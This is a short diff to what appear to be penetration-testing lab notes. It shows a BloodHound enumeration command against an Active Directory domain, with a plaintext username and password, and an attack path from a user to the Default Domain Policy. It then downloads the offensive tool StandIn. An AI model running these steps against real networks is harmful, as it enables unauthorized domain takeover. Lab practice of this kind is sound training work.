@@ -77,6 +77,14 @@ cd C:\Program Files\ManageEngine\AppManager14\working\pgsql\bin
 ┌──(kali㉿kali)-[~/lab0/96] (install bloodhound.exe first)
 └─$ bloodhound-python -u 'charlotte' -p 'Game2On4.!' -ns 192.168.105.97 -d secura.yzx -c All --dns-timeout 15
 
+Start node: CHARLOTTE@SECURA.YZX
+Target node: DEFAULT DOMAIN POLICY@SECURA.YZX
+
+┌──(kali㉿kali)-[~/lab0/96]
+└─$ wget https://github.com/FuzzySecurity/StandIn/releases/download/v1.3/StandIn_v13_Net35_45.zip
+unzip StandIn_v13_Net35_45.zip
+
+
 
 
 
